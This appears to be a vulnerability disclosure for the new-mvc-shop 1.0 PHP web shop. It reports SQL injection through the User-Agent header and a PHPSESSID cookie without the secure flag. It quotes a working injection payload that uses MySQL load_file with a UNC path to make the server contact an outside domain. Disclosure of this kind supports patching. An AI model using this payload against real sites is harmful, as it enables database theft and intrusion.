## Title: new-mvc-shop-1.0 - SQLi + SameSite attribute weak security
PHPSESSID Hijacking
## Author: nu11secur1ty
## Vendor: https://chikoiquan.tanhongit.com/
## Software: https://github.com/tanhongit/new-mvc-shop/releases/tag/v1.0
## Reference: https://portswigger.net/web-security/sql-injection

## Description:
The `User-Agent` HTTP header appears to be vulnerable to SQL injection
attacks. The payload '+(select
load_file('\\\\ttq1xmuilflmnv0pcl7cjdwb42avymmdp1koacz.pedal.com\\iqp'))+'
was submitted in the User-Agent HTTP header. This payload injects a
SQL sub-query that calls MySQL's load_file function with a UNC file
path that references a URL on an external domain. The application
interacted with that domain, indicating that the injected SQL query
was executed. The attacker can retrieve all information from the
database of this system.
---------------------------------------------------------------------------------------------------------------
The following cookie was issued by the application and does not have
the secure flag set:
PHPSESSID: The cookie appears to contain a session token, which may
increase the risk associated with this issue.
The malicious user can use one PHPSESSID to connect multiple times on
the system using the same account session.
